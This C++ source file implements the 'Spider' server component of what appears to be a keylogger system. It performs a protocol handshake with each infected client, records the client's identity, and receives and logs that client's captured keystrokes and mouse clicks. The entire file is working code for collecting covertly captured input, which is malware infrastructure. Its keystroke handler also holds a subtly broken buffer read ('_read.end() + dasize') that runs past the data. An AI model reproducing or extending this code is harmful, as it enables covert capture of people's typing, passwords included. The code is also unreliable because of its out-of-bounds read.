#include "Spider.hpp"

#include <functional>
#include <algorithm>
#include <MouseClick.hpp>

#include "HandshakeResult.hpp"
#include "MouseClick.hpp"
#include "KeyStroke.hpp"
#include "Network.hpp"
#include "AFactory.hpp"

#include "BoostCircularBuffer.hpp"

Spider::Spider(const std::shared_ptr<IConnectSocket>& sock, Network& net, ALog& log)
: _identified(false),
  _protoVersion(0),
  _read(Spider::bufferSize),
  _socket(std::move(sock)),
  _network(net),
  _log(log)
{
    _write.clear();
}

Spider::~Spider()
{
    std::cout << "Bye spider" << std::endl;
}

void Spider::spy()
{
    auto self(shared_from_this());
    _socket->async_error(std::bind([this](std::shared_ptr<Spider> lself)
    {
        _network.unregisterSpider(lself);
        std::cout << lself.use_count() << std::endl;
    }, self));

    _socket->async_read(_read, 4, [this, self](size_t csize){doHandshake(csize);});
}

const std::shared_ptr<IConnectSocket>&	Spider::getSocket(void) const
{
  return _socket;
}

void Spider::doHandshake(size_t size)
{
  auto self(shared_from_this());
  if ((_protoVersion == 0) && (size == 4))
  {
      _protoVersion = *(reinterpret_cast<uint32_t*>(_read.data()));
      if (_protoVersion == 0x312E3076) {
          _socket->async_read(_read, 1, [this, self](size_t csize){doHandshake(csize);});
      }
      else
      {
          std::vector<uint8_t> resp = HandshakeResult(0).to_bytes();
          _write.insert(_write.end(), resp.begin(), resp.end());
          _socket->async_write(_write, [this, self](size_t csize){onWrite(csize);});
          std::cout << "Wrong protocol version." << std::endl;
      }
  }
  else if (size == 1)
  {
      if (_read[0] != '\0') {
          _identity += std::string({static_cast<char>(_read[0])});
          _socket->async_read(_read, 1, [this, self](size_t csize){doHandshake(csize);});
      }
      else {
          _network.registerSpider(self);
          std::vector<uint8_t> resp = HandshakeResult(1).to_bytes();
          _write.insert(_write.end(), resp.begin(), resp.end());
          write();
          read(1);
      }
  }
}

Spider& Spider::operator<<(const std::vector<uint8_t>& buff)
{
    _write.insert(_write.end(), buff.begin(), buff.end());
    return *this;
}

void    Spider::read(size_t size)
{
    std::cout << "Wait cmdid" << std::endl;
    auto self(shared_from_this());
    _socket->async_read(_read, size, [this, self](size_t csize)
    {
        onRead(csize);
    });
}

void    Spider::write()
{
    auto self(shared_from_this());
    _socket->async_write(_write, [this, self](size_t csize)
    {
        onWrite(csize);
    });
}

void	Spider::onRead(size_t size)
{
  auto self(shared_from_this());
  if (size == 1)
  {
      uint8_t cmdId = _read[0];
      std::cout << "Received id: " << (int)cmdId << std::endl;

      switch (static_cast<APacket::PacketType>(cmdId))
      {
          case APacket::PacketType::KEYSTROKES:
              _socket->async_read(_read, 10, [this, self](size_t csize)
              {
                  std::vector<uint8_t> tmp;

                  tmp.push_back(static_cast<uint8_t>(APacket::PacketType::KEYSTROKES));
                  tmp.insert(tmp.end(), _read.begin(), _read.begin() + csize);
                  uint16_t textSize = 0;
                  textSize |= ((tmp.data())[9] << 8);
                  textSize |= ((tmp.data())[8]);
                  
                  _socket->async_read(_read, textSize, [this, self, tmp](size_t dasize)
                  {
                      std::vector<uint8_t> tmp2;
                      KeyStroke ks;

                      tmp2.insert(tmp2.end(), tmp.begin(), tmp.end());
                      tmp2.insert(tmp2.end(), _read.begin(), _read.end() + dasize);

                      try {
                          ks.from_bytes(tmp2);
                          _log.insert(ks, _identity);
                      } catch (std::exception& e)
                      {
                          std::cerr << e.what() << std::endl;
                      }
                      read(1);
                  });
              });
              break;
          case APacket::PacketType::MOUSECLICK: {
              _socket->async_read(_read, 13, [this, self](size_t csize)
              {
              std::vector<uint8_t> tmp;
              MouseClick mc;
              tmp.push_back(static_cast<uint8_t>(APacket::PacketType::MOUSECLICK));
              tmp.insert(tmp.end(), _read.begin(), _read.begin() + csize);
                 try {
                     mc.from_bytes(tmp);
                     _log.insert(mc, _identity);
                 } catch (std::exception& e)
                 {
                     std::cerr << e.what() << std::endl;
                  }
                  read(1);
              });
          }
              break;
          default:
              read(1);
              break;
      }
  }
    else
  {
      std::cout << "Proto error" << std::endl;
      read(1);
  }
}

void	Spider::onWrite(size_t size)
{
    (void)size;
}
